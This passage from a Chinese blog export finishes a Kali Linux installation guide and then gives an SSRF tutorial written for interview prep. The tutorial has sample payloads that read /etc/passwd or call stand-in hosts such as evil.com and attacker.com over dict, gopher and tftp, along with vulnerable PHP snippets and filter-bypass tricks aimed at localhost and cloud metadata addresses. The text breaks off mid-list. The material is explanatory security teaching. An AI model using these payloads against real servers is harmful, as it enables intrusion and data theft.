                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_10-47-56.43r8lqttadq0.webp"
                      alt="Snipaste_2022-11-10_10-47-56" 
                ><figcaption>Snipaste_2022-11-10_10-47-56</figcaption></figure>

<p>同时linux版本上我们选择kali，当然不同的linux版本的流程基本一致，安装ubuntu等也是一样的流程</p>
<p>kali下载地址：<a class="link"   href="https://www.kali.org/get-kali/#kali-installer-images" >https://www.kali.org/get-kali/#kali-installer-images <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  </p>
<p>务必注意一下安装平台，我的目标是安装在64位实体机器上的linux系统<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_13-28-10.6en6v2vu5rk0.webp"
                      alt="Snipaste_2022-11-10_13-28-10" 
                ><figcaption>Snipaste_2022-11-10_13-28-10</figcaption></figure></p>
<p>至于installer和Netinstall的区别，一个是镜像文件里包含一定量的系统文件和工具，另一个是啥都没有，需要联网安装，至于weekly，那就是刚刚更新的版本，everything就是全部的工具都有。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_13-28-45-1668067257514.3yt48fjz8we0.webp"
                      alt="Snipaste_2022-11-10_13-28-45-1668067257514" 
                ><figcaption>Snipaste_2022-11-10_13-28-45-1668067257514</figcaption></figure></p>
<h1 id="刷镜像"><a href="#刷镜像" class="headerlink" title="刷镜像"></a>刷镜像</h1><p>启动rufus，插入U盘，选择镜像，要注意的是，要将一整个U盘都作为使用空间去刷。<br>其余的设置照我这张图来的就行。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_13-29-42.1jo5i61xa9sw.webp"
                      alt="Snipaste_2022-11-10_13-29-42" 
                ><figcaption>Snipaste_2022-11-10_13-29-42</figcaption></figure><br>接下来要注意的是以什么镜像模式写入，虽然这里建议的是使用ISO模式，但在kali安装的过程中很容易出现找不到介质的问题，故使用DD模式。  </p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_13-30-03.45p5cdsspy40.webp"
                      alt="Snipaste_2022-11-10_13-30-03" 
                ><figcaption>Snipaste_2022-11-10_13-30-03</figcaption></figure>

<p>接下来等镜像刷好，直接重启</p>
<h1 id="改Bios"><a href="#改Bios" class="headerlink" title="改Bios"></a>改Bios</h1><p>电脑重启后，进入bios，需要改几个设置，security中的secure boot，改成我这个样子<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_16-17-17.13o4zh26iwyk.webp"
                      alt="Snipaste_2022-11-10_16-17-17" 
                ><figcaption>Snipaste_2022-11-10_16-17-17</figcaption></figure></p>
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_16-17-31.6nzjkm8p3hs0.webp"
                      alt="Snipaste_2022-11-10_16-17-31" 
                ><figcaption>Snipaste_2022-11-10_16-17-31</figcaption></figure>
然后是startup中，允许legacy boot启动，具体按我这个来就可以，要注意的是，这种启动方式会导致，  
以后只要接入kali系统盘的情况下，直接使用kali的引导进入系统。  
且windows系统进入会略慢。

<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_16-17-41.2opi8uhza9k0.webp"
                      alt="Snipaste_2022-11-10_16-17-41" 
                ><figcaption>Snipaste_2022-11-10_16-17-41</figcaption></figure>
启动顺序，我这里无脑将USB启动的都放在了前面。  
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_16-17-02.23snfrepzejk.webp"
                      alt="Snipaste_2022-11-10_16-17-02" 
                ><figcaption>Snipaste_2022-11-10_16-17-02</figcaption></figure>
保存并退出，引导至kali启动盘界面
<figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_16-16-38.6fmfv86has00.webp"
                      alt="Snipaste_2022-11-10_16-16-38" 
                ><figcaption>Snipaste_2022-11-10_16-16-38</figcaption></figure>

<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>之后的安装流程与虚拟机的安装基本大同小异，故后面的截图都用的虚拟机作为演示<br>同时我仅将需要注意的部分截图。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_14-18-50.2hgrvafomha0.webp"
                      alt="Snipaste_2022-11-10_14-18-50" 
                ><figcaption>Snipaste_2022-11-10_14-18-50</figcaption></figure><br>就是这里，如果安装介质的探测失败，就需要回到刷镜像的流程，使用另一种模式重新刷<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Snipaste_2022-11-10_14-19-31.31d01p49h9u0.webp"
                      alt="Snipaste_2022-11-10_14-19-31" 
                ><figcaption>Snipaste_2022-11-10_14-19-31</figcaption></figure><br>之后这里的对磁盘进行分区，使用向导对整个硬盘配置LVM，或者加密LVM，当然也可以手动分配，这样的目的是给之后的GRUB预留空间。</p>
<p>这里要注意的是，不要用掉全部的空间，如果你使用的硬盘是100G，就一定要留出至少1个G出来，<br>比如这个硬盘是321G（这是在虚拟机里识别出来的虚拟硬盘大小），我就大约会流出21G空闲。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-21-20.png"
                      alt="Snipaste_2022-11-10_14-21-20"
                ><figcaption>Snipaste_2022-11-10_14-21-20</figcaption></figure></p>
<p>建议将各个部分都分区，而不是都放在同一个分区里。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-22-49.png"
                      alt="Snipaste_2022-11-10_14-22-49"
                ><figcaption>Snipaste_2022-11-10_14-22-49</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-22-35.png"
                      alt="Snipaste_2022-11-10_14-22-35"
                ><figcaption>Snipaste_2022-11-10_14-22-35</figcaption></figure></p>
<p>假如没有分配空闲出来，安装后的效果就会是左上角一直闪烁光标的黑屏，无限黑屏下去。<br>原因是：后面安装GRUB给覆盖了。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_15-12-49.png"
                      alt="Snipaste_2022-11-10_15-12-49"
                ><figcaption>Snipaste_2022-11-10_15-12-49</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-23-27.png"
                      alt="Snipaste_2022-11-10_14-23-27"
                ><figcaption>Snipaste_2022-11-10_14-23-27</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-23-40.png"
                      alt="Snipaste_2022-11-10_14-23-40"
                ><figcaption>Snipaste_2022-11-10_14-23-40</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-26-16.png"
                      alt="Snipaste_2022-11-10_14-26-16"
                ><figcaption>Snipaste_2022-11-10_14-26-16</figcaption></figure></p>
<p>如果是在已经装了win的电脑上安装kali，这一页会说，这台计算机里还有个windows，要不要把GRUB安装在windows那个驱动器上</p>
<p>我的回答是，否</p>
<p>一定是把GRUB装在我刚刚留出来的空间的，不然以windows动不动就更新的尿性，GRUB会懵比。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-45-12.png"
                      alt="Snipaste_2022-11-10_14-45-12"
                ><figcaption>Snipaste_2022-11-10_14-45-12</figcaption></figure></p>
<p>选择你买的那个移动硬盘。会自动安装在硬盘分区。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-45-27.png"
                      alt="Snipaste_2022-11-10_14-45-27"
                ><figcaption>Snipaste_2022-11-10_14-45-27</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-45-41.png"
                      alt="Snipaste_2022-11-10_14-45-41"
                ><figcaption>Snipaste_2022-11-10_14-45-41</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_15-12-12.png"
                      alt="Snipaste_2022-11-10_15-12-12"
                ><figcaption>Snipaste_2022-11-10_15-12-12</figcaption></figure></p>
<p>安装结束，拔下U盘，留下硬盘，直接重新启动，静静等待kali启动的过程。</p>
<h1 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h1><p>效果就是，我整篇流程都是在这个kali上写下的，很舒服<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/win_lin/Screenshot_2022-11-10_21_17_08-1668086282838.6ovjlov1dco0.webp"
                      alt="Screenshot_2022-11-10_21_17_08-1668086282838" 
                ><figcaption>Screenshot_2022-11-10_21_17_08-1668086282838</figcaption></figure></p>
]]></content>
  </entry>
  <entry>
    <title>不过是SSRF 为什么面试官老问这个？</title>
    <url>/2023/07/19/%E4%B8%8D%E8%BF%87%E6%98%AFSSRF-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9D%A2%E8%AF%95%E5%AE%98%E8%80%81%E9%97%AE%E8%BF%99%E4%B8%AA%EF%BC%9F/</url>
    <content><![CDATA[<blockquote>
<p>回想起面试的时候总会遇到面试官问这个问题</p>
</blockquote>
<h2 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h2><p>SSRF（Server-Side Request Forgery）是一种安全漏洞，它允许攻击者在服务器端发起未经授权的请求。通过利用SSRF漏洞，攻击者可以发送伪造的请求，使服务器主动发起与其他内部或外部资源的通信，例如<strong>访问内部系统、绕过防火墙、读取敏感数据</strong>或<strong>攻击其他服务器</strong>。</p>
<p>SSRF漏洞通常出现在服务器端代码中，其中用户输入未经适当验证和过滤地被用于构造请求的<strong>URL或参数</strong>。攻击者可以利用这些漏洞来伪造请求，使服务器向受攻击的目标发起请求，而不是合法的请求目标。</p>
<h2 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h2><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.staticaly.com/gh/BrathonBai/ImgHS@main/content/why-ssrf/72b4b351a2e6b6282a2480003573bcc2.7c30f2vf8yc0.webp"
                      alt="72b4b351a2e6b6282a2480003573bcc2"
                ><figcaption>72b4b351a2e6b6282a2480003573bcc2</figcaption></figure></p>
<ol>
<li>用户输入：攻击者通过某种方式将恶意的URL或参数作为用户输入提交给服务器端的应用程序。</li>
<li>构造请求：应用程序接收到用户输入后，将其用于构造请求的URL或参数。</li>
<li>发起请求：服务器端应用程序使用构造的URL或参数发起请求。这个请求可以是HTTP、FTP、DNS或其他协议。</li>
<li>目标选择：攻击者可以利用SSRF漏洞来选择请求的目标。这可以是内部系统、本地文件、外部服务或其他受攻击的目标。</li>
<li>数据获取或攻击：服务器端应用程序发起的请求将返回响应。攻击者可以获取响应中的数据，进行进一步的攻击，或者利用响应中的信息来探测和利用其他系统漏洞。</li>
</ol>
<p>SSRF 形成的原因大都是由于 <strong>服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制</strong>。</p>
<h2 id="SSRF漏洞危害"><a href="#SSRF漏洞危害" class="headerlink" title="SSRF漏洞危害"></a>SSRF漏洞危害</h2><ol>
<li><p>访问内部系统：攻击者可以利用SSRF漏洞来发起请求，访问本地或内部网络中的敏感系统和服务。这可能包括数据库、文件系统、管理接口、内部API等。攻击者可以读取、修改或删除敏感数据，或者执行其他恶意操作。</p>
</li>
<li><p>绕过防火墙和安全限制：通过利用SSRF漏洞，攻击者可以请求绕过防火墙或安全限制的资源。例如，攻击者可以访问内网资源，绕过防火墙规则，或者通过攻击内部系统来获取敏感信息。</p>
</li>
<li><p>发起攻击：攻击者可以利用SSRF漏洞来发起攻击，例如通过请求恶意URL或构造特定的请求参数来利用其他系统的漏洞。这可能导致远程代码执行、拒绝服务攻击、服务器劫持等。</p>
</li>
<li><p>敏感信息泄露：通过SSRF漏洞，攻击者可以获取到内部系统的敏感信息，例如配置文件、API密钥、数据库凭据等。这可能导致数据泄露、隐私问题以及其他安全风险。</p>
</li>
<li><p>滥用服务器资源：攻击者可以利用SSRF漏洞来滥用服务器资源，例如通过请求大量的远程URL来消耗服务器的网络带宽、CPU或内存资源，导致服务不可用或降级。</p>
</li>
</ol>
<h2 id="SSRF利用点"><a href="#SSRF利用点" class="headerlink" title="SSRF利用点"></a>SSRF利用点</h2><p>简单来说，就是访问网站，网站需要从指定url再获取资源时，没有对url中的资源地址进行限制，从而达到黑客可以对访问地址的重新构造。<br>这种现象通常场景有：</p>
<ol>
<li>分享：通过url分享其他网站内容；</li>
<li>转码：为了适配不同设备，而通过其他服务商提供的转码功能进行转码适配；</li>
<li>在线翻译：把其他公司的翻译服务功能，通过url放置本地；</li>
<li>图片、文章分享：类似于分享功能中的获取url的功能，不过这次是获取图片等；</li>
<li>利用他站api功能：借用他功能为本站用户服务；<br>等等。。。</li>
</ol>
<blockquote>
<p>以上，可以从目标站的url中寻找以下关键字：</p>
</blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">share  </span><br><span class="line">wap  </span><br><span class="line">url  </span><br><span class="line">link  </span><br><span class="line">src  </span><br><span class="line">source  </span><br><span class="line">target  </span><br><span class="line">u  </span><br><span class="line">display  </span><br><span class="line">sourceURl  </span><br><span class="line">imageURL  </span><br><span class="line">domain</span><br></pre></td></tr></table></figure></div>

<p>如果发现目标站url中存在以上关键字，同时存在关键字后接&#x3D;，并定向到某个协议的url，那么我们可以继续利用协议构造攻击参数。</p>
<blockquote>
<p>相关伪协议</p>
</blockquote>
<ul>
<li><p>file:&#x2F;&#x2F;  – 本地文件传输协议，主要用于访问本地计算机中的文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php？url=file:///etc/passwdhttp://example.com/ssrf.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>dict:&#x2F;&#x2F;   – 字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口</p>
</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php?dict://evil.com:1337/  </span><br><span class="line">evil.com:$ nc -lvp 1337 </span><br><span class="line"></span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]  </span><br><span class="line">accepted (family 2, sport 31126)CLIENT libcurl 7.40.0</span><br></pre></td></tr></table></figure></div>
<ul>
<li>sftp:&#x2F;&#x2F;   – SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol）</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=sftp://evil.com:1337/  </span><br><span class="line">evil.com:$ nc -lvp 1337  </span><br><span class="line"></span><br><span class="line">Connection from [192.168.0.12] port 1337[tcp/*]  </span><br><span class="line">accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</span><br></pre></td></tr></table></figure></div>

<ul>
<li>ldap:&#x2F;&#x2F;   – 轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquithttp://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</span><br></pre></td></tr></table></figure></div>


<ul>
<li><p>tftp:&#x2F;&#x2F;   – 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET  </span><br><span class="line">evil.com:# nc -lvup 1337  </span><br><span class="line"></span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</span><br></pre></td></tr></table></figure></div>

</li>
<li><p>gopher:&#x2F;&#x2F; – 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://example.com/ssrf.php?url=http://attacker.com/gopher.php gopher.php (host it on acttacker.com):-&lt;?php header(&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;);?&gt;  </span><br><span class="line">evil.com:# nc -lvp 1337 </span><br><span class="line"></span><br><span class="line">Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 49398)Hissrftest</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>要注意的是，有些网站后端语言可能使用的伪协议不同，比如Java的局限性，实际场景一般利用http、https、file协议等等。</p>
<table>
<thead>
<tr>
<th></th>
<th>PHP 支持的协议</th>
<th>java支持的协议</th>
</tr>
</thead>
<tbody><tr>
<td>file:&#x2F;&#x2F;</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td>http:&#x2F;&#x2F;</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td>ftp:&#x2F;&#x2F;</td>
<td>✅</td>
<td>✅</td>
</tr>
<tr>
<td>php:&#x2F;&#x2F;</td>
<td>✅</td>
<td></td>
</tr>
<tr>
<td>zlib:&#x2F;&#x2F;</td>
<td>✅</td>
<td></td>
</tr>
<tr>
<td>data:&#x2F;&#x2F;</td>
<td>✅</td>
<td></td>
</tr>
<tr>
<td>glob:&#x2F;&#x2F;</td>
<td>✅</td>
<td></td>
</tr>
<tr>
<td>phar:&#x2F;&#x2F;</td>
<td>✅</td>
<td></td>
</tr>
<tr>
<td>ssh2:&#x2F;&#x2F;</td>
<td>✅</td>
<td></td>
</tr>
<tr>
<td>rar:&#x2F;&#x2F;</td>
<td>✅</td>
<td></td>
</tr>
<tr>
<td>ogg:&#x2F;&#x2F;</td>
<td>✅</td>
<td></td>
</tr>
<tr>
<td>expect:&#x2F;&#x2F;</td>
<td>✅</td>
<td></td>
</tr>
<tr>
<td>mailto：&#x2F;&#x2F;</td>
<td></td>
<td>✅</td>
</tr>
<tr>
<td>netdoc：&#x2F;&#x2F;</td>
<td></td>
<td>✅</td>
</tr>
<tr>
<td>gopher：&#x2F;&#x2F;</td>
<td></td>
<td>✅</td>
</tr>
<tr>
<td>jar：&#x2F;&#x2F;</td>
<td></td>
<td>✅</td>
</tr>
<tr>
<td>etc.</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="代码中的SSRF"><a href="#代码中的SSRF" class="headerlink" title="代码中的SSRF"></a>代码中的SSRF</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>在PHP中，以下函数可能会引发SSRF漏洞：</p>
<ol>
<li><p><code>file_get_contents()</code>：用于读取文件内容，也可以读取远程URL的内容。</p>
<p> 代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户</p>
</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (isset($_POST[&#x27;url&#x27;]))  </span><br><span class="line">&#123;  </span><br><span class="line">$content = file_get_contents($_POST[&#x27;url&#x27;]);  </span><br><span class="line">$filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg&#x27;;  </span><br><span class="line">file_put_contents($filename, $content);  </span><br><span class="line">echo $_POST[&#x27;url&#x27;];  </span><br><span class="line">$img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">echo $img;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<ol start="2">
<li><p><code>fopen()</code>：用于打开文件或URL，可以读取远程URL的内容。</p>
</li>
<li><p><code>curl_exec()</code>：用于执行CURL请求，可以发送HTTP请求到远程URL。</p>
<p> 通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名</p>
</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))  </span><br><span class="line">&#123;  </span><br><span class="line">$link = $_POST[&#x27;url&#x27;];  </span><br><span class="line">$curlobj = curl_init();  </span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, 0);  </span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link);  </span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);  </span><br><span class="line">$result=curl_exec($curlobj);  </span><br><span class="line">curl_close($curlobj);</span><br><span class="line"></span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;  </span><br><span class="line">file_put_contents($filename, $result);  </span><br><span class="line">echo $result;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<ol start="4">
<li><p><code>get_headers()</code>：用于获取URL的HTTP响应头。</p>
</li>
<li><p><code>simplexml_load_file()</code>：用于加载XML文件，也可以加载远程URL的XML数据。</p>
</li>
<li><p><code>include()</code> 和 <code>require()</code>：用于包含其他文件，如果允许包含远程URL，则可能导致SSRF漏洞。</p>
</li>
</ol>
<p><em>相关代码实例待补充</em></p>
<p>需要注意的是：<br>一般情况下PHP不会开启fopen的gopher wrapper ；</p>
<p>file_get_contents的gopher协议不能URL编码  ；</p>
<p>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败  ；</p>
<p>curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用  ；</p>
<p>curl_exec() 默认不跟踪跳转；</p>
<p>file_get_contents() file_get_contents支持php:&#x2F;&#x2F;input协议</p>
<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><ol>
<li><p><code>HttpClient.execute</code>：这是Java中<code>HttpClient</code>类的一个方法。它用于执行一个HTTP请求并返回一个<code>HttpResponse</code>对象。<code>HttpClient</code>类是Apache HttpClient库的一部分，它提供了一组用于执行HTTP请求的API。</p>
</li>
<li><p><code>HttpClient.executeMethod</code>：这是<code>HttpClient</code>类中的另一个方法，用于执行一个HTTP方法请求。它接受一个<code>HttpMethod</code>类的实例作为参数，并返回一个<code>int</code>类型的状态码。</p>
</li>
<li><p><code>HttpURLConnection.connect</code>：这个方法是<code>HttpURLConnection</code>类的一部分。它用于建立与<code>HttpURLConnection</code>对象指定的URL的连接。在调用此方法之后，您可以使用<code>HttpURLConnection</code>类中的其他方法与资源进行交互。</p>
</li>
<li><p><code>HttpURLConnection.getInputStream</code>：这个方法用于从<code>HttpURLConnection</code>对象获取输入流。它返回一个<code>InputStream</code>类的实例，可以用于从资源中读取数据。</p>
</li>
<li><p><code>URL.openStream</code>：这个方法是<code>URL</code>类的一部分。它用于打开到URL的连接，并返回一个用于从该连接读取的输入流。</p>
</li>
<li><p><code>HttpServletRequest</code>：这是Java中的一个接口，表示一个HTTP请求。它是Java Servlet API的一部分，提供了访问请求的各个方面的方法，如请求参数、头信息和输入流。</p>
</li>
<li><p><code>getParameter</code>：这个方法是<code>HttpServletRequest</code>接口的一部分。它用于获取请求参数的值。参数名作为字符串传递给该方法，它返回相应的值作为字符串。</p>
</li>
<li><p><code>URL</code>：这个类表示Java中的统一资源定位符（URL）。它提供了与URL一起工作的方法，如获取协议、主机、路径和查询参数等。</p>
</li>
<li><p><code>HttpClient</code>：这是Apache HttpClient库中的一个类。它提供了一组用于执行HTTP请求和处理响应的API。它可用于向服务器发送HTTP请求并接收相应的响应。</p>
</li>
<li><p><code>Request</code>：这是一个封装了HTTP请求的类。它是对<code>HttpClient</code>类的封装，为进行HTTP请求提供了更方便和用户友好的接口。</p>
</li>
<li><p><code>HttpURLConnection</code>：这是Java中表示HTTP连接的一个类。它提供了设置请求属性、发送请求和处理响应的方法。</p>
</li>
<li><p><code>URLConnection</code>：这是Java中的一个抽象类，表示与URL的连接。<code>HttpURLConnection</code>类是<code>URLConnection</code>的子类，为处理HTTP连接提供了额外的方法和功能。</p>
</li>
<li><p><code>okhttp</code>：这是一个流行的开源Java HTTP客户端库。它提供了一个简单高效的API，用于发送HTTP请求和处理响应。它广泛用于Android开发，并支持连接池、请求&#x2F;响应拦截和响应缓存等功能。</p>
</li>
<li><p><code>BasicHttpEntityEnclosingRequest</code>：这是Apache HttpClient库中的一个类。它是<code>HttpEntityEnclosingRequest</code>接口的基本实现，表示可以包含实体（如请求体）的HTTP请求。</p>
</li>
<li><p><code>DefaultBHttpClientConnection</code>：这是Apache HttpClient库中的一个类。它是<code>BHttpClientConnection</code>接口的默认实现，表示可用于发送和接收请求和响应的HTTP连接。</p>
</li>
<li><p><code>BasicHttpRequest</code>：这是Apache HttpClient库中的一个类。它是<code>HttpRequest</code>接口的基本实现，表示一个HTTP请求。</p>
</li>
<li><p><code>URI</code>：这个类表示Java中的统一资源标识符（URI）。它提供了用于处理URI的方法，如解析、解析和规范化等操作。</p>
</li>
</ol>
<p>java代码太长了，不粘了，找几个CVE代审的文章贴这里，各位自行浏览：<br><a class="link"   href="https://cloud.tencent.com/developer/article/2204394" >https://cloud.tencent.com/developer/article/2204394 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="绕过办法"><a href="#绕过办法" class="headerlink" title="绕过办法"></a>绕过办法</h2><p>已知ssrf这么高危的漏洞必然是要被各位重视的，那么肯定早就有防范办法了</p>
<p>那么，绕！</p>
<ol>
<li><p>限制为<a class="link"   href="http://www.xxx.com/" >http://www.xxx.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 域名时（利用@）</p>
<blockquote>
<p>可以尝试采用http基本身份认证的方式绕过<br>如：<a class="link"   href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异/" >http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>在PHP的parse_url中会识别<a class="link"   href="http://www.ccc.com,而libcurl则识别为www.bbb.com./" >www.ccc.com，而libcurl则识别为www.bbb.com。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
</li>
<li><p>采用短网址绕过</p>
<blockquote>
<p>比如百度短地址<a class="link"   href="https://dwz.cn/" >https://dwz.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
</li>
<li><p>采用进制转换</p>
<blockquote>
<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
</blockquote>
</li>
</ol>
<p>4.利用特殊域名</p>
<blockquote>
<p>原理是DNS解析。xip.io可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
</blockquote>
<p>5.利用[::]</p>
<blockquote>
<p>可以利用[::]来绕过localhost<br><a href="http://169.254.169.254>>http://[::169.254.169.254]">http://169.254.169.254&gt;&gt;http://[::169.254.169.254]</a></p>
</blockquote>
<p>6.利用句号</p>
<blockquote>
<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
</blockquote>
<p>7、CRLF 编码绕过</p>
<blockquote>
<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入<br><code>example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a</code>1</p>
</blockquote>
<p>8.利用封闭的字母数字</p>
<blockquote>
